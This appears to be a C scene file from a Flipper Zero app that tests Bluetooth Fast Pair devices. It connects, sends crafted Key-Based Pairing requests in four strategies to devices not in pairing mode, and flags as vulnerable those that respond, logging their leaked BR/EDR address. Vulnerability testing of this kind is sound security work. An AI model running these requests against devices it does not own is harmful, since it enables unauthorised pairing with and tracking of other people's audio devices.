#include "../whisper_pair_app_i.h"

#define CONNECT_TIMEOUT_POLLS 100 // 10s
#define KBP_RESPONSE_TIMEOUT_TICKS 50 // 5s at 100ms tick

static void log_append(WhisperPairApp* app, const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    FuriString* line = furi_string_alloc();
    furi_string_vprintf(line, fmt, args);
    furi_string_cat(app->test_log, line);
    furi_string_cat_str(app->test_log, "\n");
    furi_string_free(line);
    va_end(args);
    text_box_set_text(app->text_box, furi_string_get_cstr(app->test_log));
}

// Build a 16-byte KBP request for the given strategy
static void build_kbp_request(
    KbpStrategy strategy,
    const uint8_t* provider_addr,
    uint8_t* out) {
    memset(out, 0, 16);
    out[0] = 0x00; // KBP request type

    switch(strategy) {
    case KbpStrategyRawKbp:
        out[1] = 0x11; // INITIATE_BONDING | EXTENDED_RESPONSE
        memcpy(&out[2], provider_addr, 6);
        for(int i = 8; i < 16; i++) out[i] = rand() & 0xFF;
        break;
    case KbpStrategyRawWithSeeker:
        out[1] = 0x02; // Include seeker address
        memcpy(&out[2], provider_addr, 6);
        // Bytes 8-13: seeker address (use random)
        for(int i = 8; i < 14; i++) out[i] = rand() & 0xFF;
        for(int i = 14; i < 16; i++) out[i] = rand() & 0xFF;
        break;
    case KbpStrategyRetroactive:
        out[1] = 0x0A; // Bonding + retroactive pairing
        memcpy(&out[2], provider_addr, 6);
        for(int i = 8; i < 14; i++) out[i] = rand() & 0xFF;
        for(int i = 14; i < 16; i++) out[i] = rand() & 0xFF;
        break;
    case KbpStrategyExtendedResponse:
        out[1] = 0x10; // Extended response
        memcpy(&out[2], provider_addr, 6);
        for(int i = 8; i < 16; i++) out[i] = rand() & 0xFF;
        break;
    default:
        break;
    }
}

static void send_kbp_strategy(WhisperPairApp* app) {
    WpDevice* d = &app->devices[app->selected_idx];
    const char* name = kbp_strategy_name(app->current_strategy);

    log_append(app, "[%d/4] Strategy: %s", app->current_strategy + 1, name);

    uint8_t kbp[16];
    build_kbp_request(app->current_strategy, d->address, kbp);

    // Log the request bytes
    FuriString* hex = furi_string_alloc();
    furi_string_printf(hex, "  TX:");
    for(int i = 0; i < 16; i++) furi_string_cat_printf(hex, " %02X", kbp[i]);
    log_append(app, "%s", furi_string_get_cstr(hex));
    furi_string_free(hex);

    app->test_phase = TestPhaseWriteKbp;
    ble_gatt_client_write(app->connection_handle, app->kbp_char_handle, kbp, 16);
}

static void try_next_strategy(WhisperPairApp* app) {
    app->current_strategy++;
    if(app->current_strategy >= KbpStrategyCount) {
        // All strategies exhausted
        log_append(app, "\nAll strategies rejected");
        log_append(app, "Result: PATCHED");
        app->devices[app->selected_idx].vuln_status = WpVulnPatched;
        app->test_phase = TestPhaseDone;
        notification_message(app->notifications, &sequence_success);
    } else {
        send_kbp_strategy(app);
    }
}

void whisper_pair_scene_test_on_enter(void* context) {
    WhisperPairApp* app = context;

    furi_string_reset(app->test_log);
    app->test_phase = TestPhaseConnecting;
    app->current_strategy = KbpStrategyRawKbp;
    app->tick_count = 0;
    app->connected = false;
    app->service_count = 0;
    app->char_count = 0;
    app->kbp_char_handle = 0;
    app->kbp_response_len = 0;

    text_box_reset(app->text_box);
    text_box_set_font(app->text_box, TextBoxFontText);

    furi_mutex_acquire(app->mutex, FuriWaitForever);
    WpDevice* d = &app->devices[app->selected_idx];
    d->vuln_status = WpVulnTesting;

    log_append(app, "Target: %s", d->has_name ? d->name : "Unknown");
    log_append(app, "Model: %06lX", (unsigned long)d->model_id);
    if(!d->in_pairing_mode) {
        log_append(app, "Mode: Idle (vulnerable state)");
    } else {
        log_append(app, "Mode: Pairing (KBP normally accepted)");
    }

    uint8_t addr_type = d->address_type;
    uint8_t addr[6];
    memcpy(addr, d->address, 6);
    furi_mutex_release(app->mutex);

    // Stop scanning
    if(app->scanning) {
        gap_stop_scanning();
        gap_set_scan_callback(NULL, NULL);
        app->scanning = false;
    }

    // Disconnect existing
    GapState state = gap_get_state();
    if(state == GapStateConnected) {
        gap_disconnect(gap_get_connection_handle());
        for(int i = 0; i < 20; i++) {
            furi_delay_ms(50);
            if(gap_get_state() != GapStateConnected) break;
        }
    }

    log_append(app, "\nConnecting...");
    view_dispatcher_switch_to_view(app->view_dispatcher, WpViewTextBox);

    if(!gap_connect(addr_type, addr)) {
        log_append(app, "Connect failed");
        d->vuln_status = WpVulnError;
        app->test_phase = TestPhaseDone;
        return;
    }

    furi_timer_start(app->timer, 100);
}

bool whisper_pair_scene_test_on_event(void* context, SceneManagerEvent event) {
    WhisperPairApp* app = context;
    if(event.type != SceneManagerEventTypeCustom) return false;

    switch(app->test_phase) {
    case TestPhaseConnecting:
        if(event.event == WpCustomEventTick) {
            app->tick_count++;
            if(gap_get_state() == GapStateConnected) {
                app->connected = true;
                app->connection_handle = gap_get_connection_handle();
                log_append(app, "Connected");

                // Request MTU 83 (Fast Pair spec)
                ble_gatt_client_exchange_mtu(app->connection_handle);

                log_append(app, "Discovering services...");
                app->test_phase = TestPhaseDiscoverServices;
                ble_gatt_client_discover_services(app->connection_handle);
                return true;
            }
            if(app->tick_count >= CONNECT_TIMEOUT_POLLS) {
                furi_timer_stop(app->timer);
                log_append(app, "Connection timeout");
                app->devices[app->selected_idx].vuln_status = WpVulnError;
                app->test_phase = TestPhaseDone;
                return true;
            }
        }
        break;

    case TestPhaseDiscoverServices:
        if(event.event == WpCustomEventServicesDiscovered) {
            // Find Fast Pair service 0xFE2C
            int8_t fp_svc = -1;
            for(uint8_t i = 0; i < app->service_count; i++) {
                if(app->services[i].uuid_type == 1 &&
                   app->services[i].uuid_16 == FP_SVC_UUID) {
                    fp_svc = i;
                    break;
                }
            }
            if(fp_svc < 0) {
                log_append(app, "No Fast Pair service (0xFE2C)");
                app->devices[app->selected_idx].vuln_status = WpVulnError;
                app->test_phase = TestPhaseDone;
                return true;
            }
            log_append(app, "Found FP service");
            app->test_phase = TestPhaseDiscoverChars;
            ble_gatt_client_discover_characteristics(
                app->connection_handle, &app->services[fp_svc]);
            return true;
        }
        if(event.event == WpCustomEventGattError) {
            log_append(app, "Service discovery failed");
            app->devices[app->selected_idx].vuln_status = WpVulnError;
            app->test_phase = TestPhaseDone;
            return true;
        }
        break;

    case TestPhaseDiscoverChars:
        if(event.event == WpCustomEventCharsDiscovered) {
            // Find KBP characteristic (UUID bytes 12-13 = 0x34, 0x12)
            app->kbp_char_handle = 0;
            for(uint8_t i = 0; i < app->char_count; i++) {
                if(app->chars[i].uuid_type == 2 &&
                   app->chars[i].uuid_128[12] == FP_KBP_UUID_BYTE12 &&
                   app->chars[i].uuid_128[13] == FP_KBP_UUID_BYTE13) {
                    app->kbp_char_handle = app->chars[i].value_handle;
                    break;
                }
            }
            if(app->kbp_char_handle == 0) {
                log_append(app, "No KBP characteristic");
                app->devices[app->selected_idx].vuln_status = WpVulnError;
                app->test_phase = TestPhaseDone;
                return true;
            }
            log_append(app, "Found KBP char (0x%04X)", app->kbp_char_handle);

            // Apply device-specific pre-write delay
            furi_mutex_acquire(app->mutex, FuriWaitForever);
            const WpKnownDevice* known = app->devices[app->selected_idx].known;
            uint16_t delay = known ? known->pre_write_delay_ms : 0;
            furi_mutex_release(app->mutex);

            if(delay > 0) {
                log_append(app, "Quirk delay: %dms", delay);
                app->test_phase = TestPhasePreDelay;
                app->tick_count = 0;
                // Timer is already running at 100ms; wait delay/100 ticks
            } else {
                // Subscribe to notifications
                app->test_phase = TestPhaseSubscribe;
                log_append(app, "Subscribing to KBP notify...");
                ble_gatt_client_subscribe_notifications(
                    app->connection_handle, app->kbp_char_handle, true);
            }
            return true;
        }
        if(event.event == WpCustomEventGattError) {
            log_append(app, "Char discovery failed");
            app->devices[app->selected_idx].vuln_status = WpVulnError;
            app->test_phase = TestPhaseDone;
            return true;
        }
        break;

    case TestPhasePreDelay:
        if(event.event == WpCustomEventTick) {
            app->tick_count++;
            furi_mutex_acquire(app->mutex, FuriWaitForever);
            const WpKnownDevice* known = app->devices[app->selected_idx].known;
            uint16_t delay = known ? known->pre_write_delay_ms : 0;
            furi_mutex_release(app->mutex);

            if(app->tick_count * 100 >= delay) {
                app->test_phase = TestPhaseSubscribe;
                log_append(app, "Subscribing to KBP notify...");
                ble_gatt_client_subscribe_notifications(
                    app->connection_handle, app->kbp_char_handle, true);
            }
            return true;
        }
        break;

    case TestPhaseSubscribe:
        if(event.event == WpCustomEventWriteComplete ||
           event.event == WpCustomEventGattError) {
            // Subscribe done (or failed, proceed anyway)
            log_append(app, "\n-- KBP Testing --");
            app->current_strategy = KbpStrategyRawKbp;
            send_kbp_strategy(app);
            return true;
        }
        break;

    case TestPhaseWriteKbp:
        if(event.event == WpCustomEventWriteComplete) {
            log_append(app, "  Write accepted");
            app->test_phase = TestPhaseWaitResponse;
            app->tick_count = 0; // start timeout counter
            return true;
        }
        if(event.event == WpCustomEventGattError) {
            log_append(app, "  Write rejected");
            try_next_strategy(app);
            return true;
        }
        break;

    case TestPhaseWaitResponse:
        if(event.event == WpCustomEventNotification) {
            // Got KBP response — VULNERABLE!
            log_append(app, "  KBP RESPONDED!");

            // Parse response
            FuriString* hex = furi_string_alloc();
            furi_string_printf(hex, "  RX:");
            for(uint16_t i = 0; i < app->kbp_response_len && i < 16; i++) {
                furi_string_cat_printf(hex, " %02X", app->kbp_response[i]);
            }
            log_append(app, "%s", furi_string_get_cstr(hex));

            // Check response type
            if(app->kbp_response_len > 0) {
                if(app->kbp_response[0] == 0x01) {
                    log_append(app, "  Type: Standard KBP response");
                    if(app->kbp_response_len >= 7) {
                        log_append(app, "  BR/EDR: %02X:%02X:%02X:%02X:%02X:%02X",
                            app->kbp_response[6], app->kbp_response[5],
                            app->kbp_response[4], app->kbp_response[3],
                            app->kbp_response[2], app->kbp_response[1]);
                    }
                } else if(app->kbp_response[0] == 0x02) {
                    log_append(app, "  Type: Extended response");
                }
            }
            furi_string_free(hex);

            log_append(app, "\nResult: VULNERABLE");
            app->devices[app->selected_idx].vuln_status = WpVulnVulnerable;
            app->test_phase = TestPhaseDone;
            notification_message(app->notifications, &sequence_double_vibro);
            notification_message(app->notifications, &sequence_blink_red_100);
            return true;
        }
        if(event.event == WpCustomEventTick) {
            app->tick_count++;
            if(app->tick_count >= KBP_RESPONSE_TIMEOUT_TICKS) {
                log_append(app, "  No response (timeout)");
                try_next_strategy(app);
                return true;
            }
        }
        if(event.event == WpCustomEventGattError) {
            log_append(app, "  Error during wait");
            try_next_strategy(app);
            return true;
        }
        break;

    case TestPhaseDone:
        break;
    }

    return false;
}

void whisper_pair_scene_test_on_exit(void* context) {
    WhisperPairApp* app = context;
    furi_timer_stop(app->timer);
    if(app->connected) {
        gap_disconnect(app->connection_handle);
        app->connected = false;
    }
    text_box_reset(app->text_box);
}
